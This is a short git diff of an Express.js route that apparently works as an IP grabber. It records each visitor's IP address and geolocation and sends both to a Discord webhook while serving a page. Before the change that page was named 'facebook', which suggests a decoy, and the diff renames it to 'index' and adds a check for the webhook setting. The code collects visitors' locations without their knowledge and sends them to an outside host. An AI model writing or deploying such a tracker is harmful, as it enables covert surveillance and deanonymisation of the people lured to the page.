@@ -2,6 +2,9 @@ const express = require('express')
 const router = express.Router()
 const geoip = require('geoip-lite');
 const { Webhook, MessageBuilder } = require("discord-webhook-node");
+if (!process.env.WEBHOOK_URI) {
+  console.log("Error: No WEBHOOK_URI detected in .env")
+}
 const hook = new Webhook(process.env.WEBHOOK_URI);
 const d = new Date();
 let date = d.toDateString();
@@ -12,7 +15,7 @@ router.get("/", (req, res, next) => {
     if(!ip) {
         hook.send("No ip address detected, server is likely running in localhost. Please use a proxy.")
         console.log(ip)
-        res.render("facebook")
+        res.render("index")
     } else {
       const SplitIp = ip.split(",")[0];
       const geo = geoip.lookup(SplitIp) || { country: null, region: null, timezone: null, city: null };
@@ -48,7 +51,7 @@ router.get("/", (req, res, next) => {
         console.log(`${ip} just accessed the site.`)
         console.log(geo)
         hook.send(embed);
-        res.render('facebook')
+        res.render('index')
       }
     }
   } catch (error) {
